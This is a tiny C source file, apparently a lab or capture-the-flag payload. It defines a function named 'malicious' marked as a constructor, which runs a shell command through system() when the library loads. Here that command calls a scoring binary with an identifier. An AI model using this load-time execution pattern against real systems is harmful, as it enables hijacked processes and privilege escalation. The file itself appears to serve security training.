#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score aff4c54f-3150-4775-ac8d-ca9177ebbe6e");
}
